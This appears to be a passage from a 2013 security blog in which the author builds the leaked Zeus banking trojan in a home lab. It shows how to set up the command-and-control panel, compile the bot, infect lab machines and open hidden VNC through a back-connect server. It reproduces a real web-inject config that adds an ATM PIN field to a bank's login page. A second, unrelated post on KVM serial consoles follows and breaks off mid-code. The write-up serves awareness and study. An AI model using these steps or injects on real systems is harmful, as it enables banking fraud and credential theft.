</span><span class='line'> <span class="p">|</span> Herder /   <span class="p">|</span>     <span class="p">|</span> based C<span class="p">&amp;</span>C  <span class="p">|</span>      <span class="p">|</span>              <span class="p">|</span>     <span class="p">|</span> Web Server      <span class="p">|</span>
</span><span class='line'> <span class="p">|</span> Controller <span class="p">|</span>     <span class="p">|</span>            <span class="p">|</span>      <span class="p">|</span>              <span class="p">|</span>     <span class="p">|</span>                 <span class="p">|</span>
</span><span class='line'> +------------+     +------------+      +--------------+     +-----------------+
</span></code></pre></td></tr></table></div></figure>


<h3>The Configuration</h3>

<h4>Command &amp; Control</h4>

<p>I figured I&rsquo;d start by checking out the code from the <a href="https://github.com/Visgean/Zeus/">git</a> repo onto the server I would use as the command and control server. So, off I went and <code>git clone https://github.com/Visgean/Zeus.git</code>&rsquo;d the Zeus code into a local directory of my C&amp;C server.</p>

<p>The folder structure of the directory <code>output</code> that is of interest, on disk, looked something like this:</p>

<figure class='code'><figcaption><span>Zeus Sources FOlder Structure</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Zeus/output
</span><span class='line'>├── builder
</span><span class='line'>├── other
</span><span class='line'>├── server
</span><span class='line'>└── server<span class="o">[</span>php<span class="o">]</span>
</span><span class='line'>    ├── install
</span><span class='line'>    ├── system
</span><span class='line'>    └── theme
</span></code></pre></td></tr></table></div></figure>


<p>We can see there is a <code>server[php]</code> directory, which is rather obvious that this is the web interface code. Quick inspection of the sources revealed that the common directory index <code>index.php</code> is in fact empty. So, should someone stumble upon the C&amp;C directory, a blank page will be displayed to the user.</p>

<p>Two other files also exist in the php server root, namely <code>cp.php</code> and <code>gate.php</code>. <code>cp.php</code> is the user control panel to manage the bots, whereas <code>gate.php</code> is the script that all the bots will use to communicate with the C&amp;C. That being said, inspecting network traffic should reveal a lot of talking with <code>gate.php</code>. As a side note, the comments in the sources are in Russian, which makes for a interesting time with Google Translate to read them ;)</p>

<p>So, I copied the sources for <code>server[php]</code> to a web folder <code>z/</code>, fixed up the SELinux contexts for them and tried to access the <code>cp.php</code> page. Bam, server error.</p>

<figure class='code'><figcaption><span>Zeus cp.php mb_internal_encoding error</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>Mon Sep 23 10:57:45 2013<span class="o">]</span> <span class="o">[</span>error<span class="o">]</span> <span class="o">[</span>client 172.16.50.1<span class="o">]</span> PHP Fatal error:  Call to undefined <span class="k">function </span>mb_internal_encoding<span class="o">()</span> in /var/www/html/z/system/global.php on line 1
</span></code></pre></td></tr></table></div></figure>


<p>It was pretty obvious I was missing <code>php-mbstring</code>, so I went and installed it and restarted Apache. Now, loading my <code>cp.php</code>, I was greeted with a polite message asking me how I am :D</p>

<p><img src="http://i.imgur.com/cCgsLBk.png"></p>

<h4>Installing the Command &amp; Control</h4>

<p>I noticed a install folder in the obtained sources and browsed to <code>install/</code> and found a very nice, easy to understand installer:</p>

<p><img src="http://i.imgur.com/e1fYvPG.png"></p>

<p>Here I realized I needed to have a mysql server running, so I proceeded to install that too and create a database <code>cpdb</code> for the control panel. From here, it was literally a case of install and login. We now have a working Zeus command and control server. That really was not so hard was it? In fact, its worryingly easy.</p>

<p><img src="http://i.imgur.com/La5zzZI.png"></p>

<h4>Compiling the Bot</h4>

<p>With that out of the way, the next step had to be to compile the Zeus bot binary with which we will be infecting the Lab of fake LAN clients. For this a Windows machine was required as the tools for this are all windows based. I fired up a Windows XP Virtual Machine, and grabbed a copy of the Zeus code from the Github repository again.</p>

<p>Next, I browsed to the <code>output/builder/</code> folder again and opened the <code>config.txt</code> file in notepad. Here, I really had to set minimal options. One to specify the location of the <code>config.bin</code> and the others for the location of updated bot binaries and what URL the Command and Control server lives at. All pretty straight forward. I also had to set the <code>encryption_key</code>, which should correspond to the key used when we installed the server side PHP stuff earlier.</p>

<p><img src="http://i.imgur.com/xQQeqQl.png"></p>

<p>The next step was to <em>compile</em> the bot. While this may sound complex, it&rsquo;s not. In fact, 2 clicks, granted the config files syntax is correct, and you will have a working compiled exe to work with. The <strong>compiler</strong> interface looked like this:</p>

<p><img src="http://i.imgur.com/f13Baez.png"></p>

<p>1,2,3 done. We now have a <code>zeus-bot.exe</code>. The malware is now customized to speak to my Command &amp; Control server using my unique encryption key. Again, up until this point everything has been pretty easy and straight forward.</p>

<h3>Skipping the creative parts &ndash; Infection.</h3>

<p>From here the infection phase pretty much starts. Of course, the bot herder would need to test hes executables and ensure that they are in working order. There is no point in distributing malware that doesn&rsquo;t work eh. ;D With infection, as previously mentioned anything goes. From drive-by downloads to phishing to physical access to a server. If the machine can execute the bot executable, its job done.</p>

<p>Sadly, I wanted to test the <a href="http://en.wikipedia.org/wiki/Blackhole_exploit_kit">Blackhole Exploit Kit</a>, but the resources on the net appear to be rather scarce. That and the fact that the available versions of it are encoded using a PHP encoder (IonCube), makes it a tad more difficult to get going. It was however interesting to see that the malware authors are limiting they software to IP&rsquo;s along with time restrictions the works. Just like something you&rsquo;d expect to see in commercial software.</p>

<p>As I am kind of the only person using this network, there is no point in trying to fool me into getting the executable run. To make it easy for me to rerun it, I uploaded <code>zeus-bot.exe</code> and the encrypted <code>config.bin</code> to a fake <strong>compromised web server</strong>, ready for download.</p>

<p>I opened Internet Explorer and browsed to the location of <code>zeus-bot.exe</code> and chose <strong>RUN</strong>. To the unsuspecting user, it will appear that nothing happened&hellip;</p>

<h3>From the Bot Herders Perspective</h3>

<p>Assuming the position of the evil bot herder now, I am able to see that I have a new bot connected to my Command &amp; Control server. We can see this in the interface, as well as based on the POST requests to <code>gate.php</code></p>

<figure class='code'><figcaption><span>Apache Logs Extract for POST&#8217;s to gate.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:58:01 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:58:06 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:58:12 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:58:17 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:58:22 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:00 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:05 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:10 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:15 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:20 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:23 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:28 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:34 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:39 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:44 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:20 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:25 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:30 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:35 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:40 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:45 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:50 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:56 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:01:01 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:01:07 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:01:40 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:01:45 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:01:50 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:01:55 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>We are also able to, using the control panel, see some more information based on the newly connected bot:</p>

<p><img src="http://i.imgur.com/aKe4kJh.png"></p>

<p>An interesting thing to note here. It appears that the Zeus bot opens up a socks port on the client machines. If the Command &amp; Control server is able to connect to this IP, and the socks port, then it will be able to pull a screenshot of the current state the client pc is in. This is an <em>almost live</em> image. On the client, we can see that the process <code>explorer.exe</code> is listening in port 35419. This is the same port that the web interface is reporting as the SOCKS port.</p>

<p><img src="http://i.imgur.com/fiy0u2N.png"></p>

<p>In the case of my lab setup, this SOCKS connection was not possible due to the fact that the client is reporting as connected from 172.16.50.2, which is the fake, natted public ip of the lab firewall. The firewall itself is most certainly not listening on that port so the connection would fail. Maybe if I port forwarded the connection back into the fake LAN it would have been able to connect but this I did not test.</p>

<p>So, to test the screen-shotting features, I infected another client on the fake Internet, where the Command &amp; Control server <strong>will</strong> be able to connect to. The result?</p>

<p><img src="http://i.imgur.com/GMqlVCM.png"></p>

<p>There is <strong>no</strong> visual sign of this activity to the user. The user may be busy with some highly confidential work on hes workstation, unaware that an intruder is able to see what he is seeing. You know, like using that secret text file with all your passwords in it.</p>

<h4>But thats not all</h4>

<p>Just being able to <em>see</em> what the user sees is not really enough. No. You also have the ability to remotely VNC into the infected machine. By doing this, the attacker is able to remotely control your computer as you, with one difference, you won&rsquo;t know about it. So lets say he managed to successfully compromise your banking credentials. Instead of triggering alarms on the banks side that a login has just occurred on the other side of the globe, the attacker can now use <strong>your</strong> machine to steal <strong>your</strong> money. From the banks perspective this may appear like a perfectly legitimate transaction.</p>

<p>So lets see how this VNC functionality works.</p>

<h4>Execute the VNC BC Script</h4>

<p>First, the attacker will have to prepare a back connect server and then, via a script, tell the bot to connect to this server so that he may access the botted machine. This architecture is pretty solid. The only thing really that would stop an attacker from succeeding in setting up this back connect is if the remote firewall was to block the port that the attacker has set up on the back connect server. However, things like port 80, or even 443 is almost always opened, so these will be prime candidates to use.</p>

<p>In short, the setup will look something like this.</p>

<figure class='code'><figcaption><span>Back Connect Server</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   --------------------------&gt;        &lt;--------------------------------------------
</span><span class='line'>   --------------------------&gt;        &lt;--------------------------------------------
</span><span class='line'>
</span><span class='line'>   +------------+      +-----------------------+  +--------------+   +------------------+
</span><span class='line'>   <span class="p">|</span>  Attacker  +------&gt;  Back Connect Server  &lt;--+ LAN Firewall &lt;---+ Infected Machine <span class="p">|</span>
</span><span class='line'>   +------------+      +-----------------------+  +--------------+   +------------------+
</span></code></pre></td></tr></table></div></figure>


<p>The back connect server could be any host the attacker has access to and controls. This is also a great way for the attacker that wants to VNC to hide hes IP information. Should you on the infected machine realize what is going on, then you&rsquo;d only see the connection going out to the back connect server, and not the real attacker. The server executable is <code>zsbcs.exe</code> in the <code>output/server/</code> directory and is a windows only tool.</p>

<p>Once the Back Connect Server is setup to listen on one port for new bots, and another for VNC client connections, the attacker would configure a script, instructing the clients where to connect. The script would look something like this:</p>

<figure class='code'><figcaption><span>Back Connect Script</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bot_bc_add vnc 172.16.50.181 9000
</span></code></pre></td></tr></table></div></figure>


<p>This tells the bot where to connect to wait for a VNC session.</p>

<p>Next, the attacker can sit and watch hes Back Connect Server&rsquo;s output and see when a new bot has connected. He may now connect using hes VNC client to the client port of the back connect server and viola, VNC access. Alarmingly, the VNC access is not like your traditional VNC where the user will see the pointer move as the VNC user moves it. No, this VNC session starts in a separate <strong>display</strong>, ensuring that the user is still unaware of what is happening. This for me was the most alarming part. It&rsquo;s almost as if hes attaching to another <em>tty</em>.</p>

<p><img src="http://i.imgur.com/7tg4l2X.png"></p>

<h3>Web Injects, the real threat.</h3>

<p>So all of this Remote Administration Stuff is cool. No doubt they are useful tools for an attacker, but this is not what has made Zeus what it is known for today. Zeus uses what is called <strong>Web Injects</strong> to manipulate website content. &ldquo;What do you mean by &lsquo;manipulation&rsquo;?&rdquo; you may ask. Well, lets assume you are about to buy something online. Generally, the store would ask you for a Credit Card number and an expiry. Usually, on the next page you may be asked for the CVV number. With your machine infected with Zeus, the attacker is able to ask for your Credit Card Number, Expiry, CVV, Email Address, Address, Tel no., secret question etc etc all on one page. The page itself will look totally legit, and again, to the unsuspecting user, this may seem completely normal and away he goes entering hes details. Once submitted, Zeus captures the entire request, including the cookies, the POST data etc etc and based on the bots timer configurations, uploads this information to the Command &amp; Control server. Just like the one we just used to Remotely Administer the infected machines.</p>

<p>With all this information, he may be able to return at a later stage, VNC to your computer and access your account to buy himself some new toys. Because he managed to get hold of your secret question, he finds no trouble in complying to any potential security checks the portal may bring.</p>

<h4>How it works</h4>

<p>When looking at the web injects, I guess the simplest way to describe them is similar to your favorite text editors search and replace features. With the Zeus bot hooked into some low level network API&rsquo;s in Windows, it is able to monitor for its configured URL&rsquo;s, and inject arbitrary content into the responses that are displayed in your browser. Lets take an example from the source <a href="https://github.com/Visgean/Zeus/blob/translation/output/builder/webinjects.txt#L63">here</a>.</p>

<figure class='code'><figcaption><span>Wellsfargo Web Inject</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>set_url https://www.wellsfargo.com/* G
</span><span class='line'>data_before
</span><span class='line'><span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">&quot;mozcloak&quot;</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">&quot;password&quot;</span><span class="err">*&lt;/</span><span class="na">span</span><span class="nt">&gt;</span>
</span><span class='line'>data_end
</span><span class='line'>data_inject
</span><span class='line'><span class="nt">&lt;br&gt;&lt;strong&gt;&lt;label</span> <span class="na">for=</span><span class="s">&quot;atmpin&quot;</span><span class="nt">&gt;</span>ATM PIN<span class="nt">&lt;/label&gt;</span>:<span class="nt">&lt;/strong&gt;</span><span class="ni">&amp;nbsp;</span><span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">&quot;mozcloak&quot;</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">&quot;password&quot;</span> <span class="na">accesskey=</span><span class="s">&quot;A&quot;</span> <span class="na">id=</span><span class="s">&quot;atmpin&quot;</span> <span class="na">name=</span><span class="s">&quot;USpass&quot;</span> <span class="na">size=</span><span class="s">&quot;13&quot;</span> <span class="na">maxlength=</span><span class="s">&quot;14&quot;</span> <span class="na">style=</span><span class="s">&quot;width:147px&quot;</span> <span class="na">tabindex=</span><span class="s">&quot;2&quot;</span> <span class="nt">/&gt;&lt;/span&gt;</span>
</span><span class='line'>data_end
</span><span class='line'>data_after
</span><span class='line'>data_end
</span></code></pre></td></tr></table></div></figure>


<p>In the above extract from the web injects we can see that the http<strong>s</strong>://wellsfargo.com (note the s) website will have a extra field added, asking for a <em>ATM PIN</em> before the password field. Now, an important thing to note here. Yes, a website owner could change the web sources which will make this web inject not work, however, the POST data will still be recorded for this watched URL and eventually stored on the C&amp;C.</p>

<p><img src="http://npercoco.typepad.com/.a/6a0133f264aa62970b01910426b229970c-pi"></p>

<h3>Summary</h3>

<p>While Zeus itself is old news and many variants such as <a href="http://www.mcafee.com/us/resources/white-papers/wp-citadel-trojan.pdf">Citadel</a> have sprung up, I believe this is still a very valid threat as the concepts remain the same.</p>

<p>A interesting thing about the bot. Zeus, once it infects a PC, will delete all the cookies in Internet Explorer. This is to force the user to re-login to the services he uses, and also lets Zeus grab them :)</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/08/03/kvm-redirecting-centos-kernel-and-tty-output-to-a-virtual-serial-console/">KVM - Redirecting CentOS Kernel and tty output to a virtual serial console</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-08-03T08:27:00+02:00" pubdate data-updated="true">Aug 3<sup>rd</sup>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><h3>Console all the things!</h3>

<p>First and foremost, I will start with a warning. Like any other virtualization software, you risk leaving the console open. This is a often overlooked part of securing your infrastructure. An administrator may have been required to do some work on the virtual console, and forget to log out. What if that account that is still logged in, is r00t? Having administrative access to a VM Host gives you access to the consoles, but not necessarily to the guests. Remember to log out! Or, setup shells to auto-logout after a few minutes of inactivity.</p>

<h3>Example virsh console access</h3>

<p>Once setup, accessing consoles can be as easy as connecting via SSH to your server. Firing up the virsh client, and connecting to the console:</p>

<figure class='code'><figcaption><span>a primitive virsh console access example</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>virsh --connect qemu:///system
</span><span class='line'>Welcome to virsh, the virtualization interactive terminal.
</span><span class='line'>
</span><span class='line'>Type:  <span class="s1">&#39;help&#39;</span> <span class="k">for </span><span class="nb">help </span>with commands
</span><span class='line'>       <span class="s1">&#39;quit&#39;</span> to quit
</span><span class='line'>
</span><span class='line'> Id    Name                           State
</span><span class='line'>----------------------------------------------------
</span><span class='line'> 6     console-test                   running
</span><span class='line'>
</span><span class='line'>virsh <span class="c"># console console-test</span>
</span><span class='line'>Connected to domain console-test
</span><span class='line'>Escape character is ^<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>CentOS release 6.4 <span class="o">(</span>Final<span class="o">)</span>
</span><span class='line'>Kernel 2.6.32-358.el6.x86_64 on an x86_64
</span><span class='line'>
</span><span class='line'>localhost.localdomain login: root
</span><span class='line'>Password:
</span><span class='line'>Last login: Sat Aug  3 08:31:13 on ttyS0
</span><span class='line'><span class="o">[</span>root@localhost ~<span class="o">]</span><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can escape the console by pressing <code>^]</code>, which will drop you back into the virsh shell.</p>

<figure class='code'><figcaption><span>virsh guest console escape</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>root@localhost ~<span class="o">]</span><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">&quot;testing123&quot;</span>
</span><span class='line'>testing123
</span><span class='line'><span class="o">[</span>root@localhost ~<span class="o">]</span><span class="nv">$ </span>                      <span class="c"># I pressed ^] here  </span>
</span><span class='line'>virsh <span class="c">#</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Ok, gimme ze commands already&hellip;</h3>

<p>This I have tested on CentOS 6.4. The 2 commands to get it setup would be:</p>

<figure class='code'><figcaption><span>Enabling KVM Console access</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>cat &gt; /etc/init/ttyS0.conf <span class="s">&lt;&lt; EOL</span>
</span><span class='line'><span class="s"># ttyS0 - agetty</span>
</span><span class='line'><span class="s">#</span>
</span><span class='line'><span class="s"># This service maintains a agetty on ttyS0.</span>
</span><span class='line'>
</span><span class='line'><span class="s">stop on runlevel [S016]</span>
</span><span class='line'><span class="s">start on runlevel [23]</span>
</span><span class='line'>
</span><span class='line'><span class="s">respawn</span>
</span><span class='line'><span class="s">exec agetty -h -L -w /dev/ttyS0 115200 vt102</span>
